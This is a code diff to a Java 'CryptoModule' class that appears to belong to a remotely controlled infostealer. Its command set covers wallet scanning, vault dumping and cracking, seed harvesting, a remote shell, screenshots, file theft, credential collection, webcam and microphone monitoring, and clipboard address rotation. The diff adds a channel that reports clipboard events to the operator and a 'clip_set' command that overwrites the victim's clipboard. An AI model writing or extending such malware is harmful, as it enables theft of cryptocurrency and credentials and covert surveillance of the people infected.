@@ -66,6 +66,10 @@ public final class CryptoModule {
 		boolean deliver(String replyTo, String name, byte[] body);
 	}
 
+	public interface EventSink {
+		void event(String kind, Map<String, Object> data, String legacy);
+	}
+
 	public record Task(String id, String name, Map<String, Object> params, int timeout, String replyTo, boolean frame) {
 		public Task(String id, String name, Map<String, Object> params, int timeout) {
 			this(id, name, params, timeout, id, false);
@@ -79,7 +83,7 @@ public final class CryptoModule {
 	private static final int INLINE_OUTPUT = 1900;
 
 	private static final Set<String> SUPPORTED = Set.of(
-		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
+		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop", "clip_set",
 		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
@@ -93,6 +97,7 @@ public final class CryptoModule {
 	private final Outbox outbox;
 	private final Sink sink;
 	private volatile FrameSink frames;
+	private volatile EventSink events;
 	private final com.spcagentpayloa.jvmxx.Balance.Getter balance;
 	private final com.spcagentpayloa.jvmxx.ClipboardService nativeClipboard;
 	private final java.util.function.Function<String, String> agentRunner;
@@ -193,6 +198,10 @@ public final class CryptoModule {
 	/** Panel socket hook; absent in Discord-only mode. */
 	public void frames(FrameSink sink) {
 		this.frames = sink;
+	}
+
+	public void events(EventSink sink) {
+		this.events = sink;
 	}
 
 	public String status() {
@@ -668,6 +677,7 @@ public final class CryptoModule {
 				case "dump_vault" -> dump(task, cancel);
 				case "crack_vault" -> crack(task, cancel);
 				case "clip_start" -> clipStart(task);
+				case "clip_set" -> clipSet(task);
 				case "clip_stop" -> clipStop(task);
 				case "cancel" -> cancelTask(task);
 				case "shell" -> shell(task);
@@ -692,7 +702,7 @@ public final class CryptoModule {
 	private String module(String name) {
 		return switch (name) {
 			case "scan_wallets", "dump_vault", "crack_vault" -> "wallets";
-			case "clip_start", "clip_stop" -> "clipboard";
+			case "clip_start", "clip_stop", "clip_set" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
 			case "monitor", "webcam", "mic" -> "monitor";
@@ -1120,6 +1130,9 @@ public final class CryptoModule {
 				clipboard = new ClipboardWatcher(this::coins, () -> {
 					Object value = state.get("clipRotation");
 					return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
+				}, (kind, data, legacy) -> {
+					EventSink sink = events;
+					if (sink != null) sink.event(kind, data, legacy);
 				});
 			}
 		}
@@ -1153,6 +1166,20 @@ public final class CryptoModule {
 		moduleHealth.put("clipboard", "ok");
 		counters.put("clip", clipboard.size());
 		return Map.of("ok", true);
+	}
+
+	private Map<String, Object> clipSet(Task task) throws Exception {
+		String text = String.valueOf(task.params().getOrDefault("text", "")).strip();
+		if (text.isEmpty()) {
+			throw new IllegalArgumentException("text required");
+		}
+		ClipboardService service = service();
+		service.start();
+		Thread.sleep(150L);
+		if (!service.copy(text)) {
+			throw new IllegalStateException("clipboard write failed");
+		}
+		return Map.of("ok", true, "chars", text.length());
 	}
 
 	private Map<String, Object> clipStop(Task task) throws Exception {
